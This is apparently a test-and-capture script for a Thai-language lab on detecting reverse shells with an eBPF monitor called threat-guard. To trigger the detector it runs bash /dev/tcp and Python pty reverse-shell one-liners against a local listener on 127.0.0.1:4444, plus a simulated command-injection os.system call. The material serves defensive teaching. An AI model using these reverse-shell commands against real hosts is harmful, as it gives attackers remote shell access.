#!/usr/bin/env bash
# Week 15: reverse shell guard — real exec tracepoint, attacker listener on 127.0.0.1:4444
source "$(dirname "$0")/lib.sh"
lab_init phase07-advanced-security-observability/week15-reverse-shell-guard
make -s all >/dev/null 2>&1

LOG=$(mktemp); LOG2=$(mktemp); LLOG=$(mktemp); LPID=""
cleanup() {
    sudo pkill -INT -f '^./bin/threat-guard' 2>/dev/null
    [ -n "$LPID" ] && kill "$LPID" 2>/dev/null
    rm -f "$LOG" "$LOG2" "$LLOG" "$LAB_DIR/listener.py" "$LAB_DIR/x"
}
trap cleanup EXIT

# append_guard <log>: threat-guard is host-wide and other labs/agents run
# concurrently, so INFO-SHELL lines whose parent is not one of our test
# commands (bash/python3 run from this terminal; "script" is the pty wrapper
# of the capture, which bash -c exec()s into) are replaced by a dim note.
# Every alert above INFO is kept.
append_guard() {
    python3 - "$1" >> "$SHOT_FILE" <<'PY'
import sys
lines = open(sys.argv[1], errors="replace").read().replace("\r", "").replace("^@", "").split("\n")
out, cut, wrap, state = [], 0, 0, "head"
for l in lines:
    f = l.split()
    if state == "head":
        out.append(l)
        if l.startswith("-----"): state = "ev"
    elif state == "ev" and len(f) >= 7 and f[0][:2].isdigit():
        if f[1] == "INFO-SHELL" and f[6] not in ("bash", "python3", "script"):
            cut += 1
        elif f[1] == "INFO-SHELL" and f[6] == "script" and f[7] == "/bin/bash":
            wrap += 1   # the capture's own pty shell (= the student's prompt)
        else:
            out.append(l)
    else:
        if state == "ev" and cut + wrap:
            out.append("\x1b[2m# (... ตัด INFO-SHELL พื้นหลังจากโปรเซสอื่นบนเครื่อง %d บรรทัด และ shell ของตัวบันทึกหน้าจอ %d บรรทัด ...)\x1b[0m" % (cut, wrap))
        state = "tail"; out.append(l)
print("\n".join(out).rstrip("\n"))
PY
}

# listener.py exactly as in README step 2 (temporary)
cat > listener.py <<'PY'
import socket
srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", 4444)); srv.listen(1); srv.settimeout(20)   # 127.0.0.1 เท่านั้น
for i in range(3):
    c, a = srv.accept(); c.settimeout(3)
    c.sendall(b"echo shell-uid=$(id -u) comm=$(cat /proc/$$/comm); exit\n")
    out = b""
    try:
        while (d := c.recv(4096)): out += d
    except socket.timeout: pass
    print(f"[listener] conn {i+1} from {a[0]}:{a[1]} -> {out.decode(errors='replace').strip()!r}")
    c.close()
PY

bg "$LOG" sudo ./bin/threat-guard -all
sleep 3
python3 -u listener.py > "$LLOG" 2>&1 &
LPID=$!
sleep 1

shot_begin 1-attacks "Terminal 3 — จำลองเหตุการณ์ (a)-(d) + Terminal 1 listener"
run 'bash -c "echo benign"'
run "bash -c 'exec 3<>/dev/tcp/127.0.0.1/4444; exec sh <&3 >&3 2>&3'"
run "cp /bin/sh ./x && bash -c 'exec 3<>/dev/tcp/127.0.0.1/4444; exec ./x <&3 >&3 2>&3'; rm -f ./x"
run "python3 -c 'import socket,os,pty; s=socket.create_connection((\"127.0.0.1\",4444)); [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn(\"/bin/sh\")'"
wait "$LPID"; LPID=""
note "Terminal 1:"
prompt_only python3 listener.py
append "$LLOG"
shot_end

shot_begin 4-cleanup-check "Terminal 3 — ตรวจ map และสภาพแวดล้อม"
run "sudo bpftool map dump name watch_names | head"
sleep 1
bg_stop '^./bin/threat-guard'
# [l]/[t] keep pgrep from matching the capture wrapper's own command line
show 'pgrep -af "listener.py|threat-guard" || echo "clean"' \
     'pgrep -af "[l]istener.py|[t]hreat-guard" || echo "clean"'
shot_end

shot_begin 2-guard "Terminal 2 — sudo ./bin/threat-guard -all"
prompt_only sudo ./bin/threat-guard -all
append_guard "$LOG"
shot_end

# 4.3: python3 added to the daemon list for the experiment only
bg "$LOG2" sudo ./bin/threat-guard -daemons nginx,apache2,httpd,php-fpm,node,python3
sleep 3
shot_begin 3-rce "Daemon-spawned shell (CRITICAL-RCE)"
note "Terminal 3: จำลอง web app ที่ถูก command injection แล้วเรียก os.system()"
run "python3 -c 'import os; os.system(\"id -un\")'"
sleep 1
bg_stop '^./bin/threat-guard'
note "Terminal 2:"
prompt_only sudo ./bin/threat-guard -daemons nginx,apache2,httpd,php-fpm,node,python3
append_guard "$LOG2"
shot_end
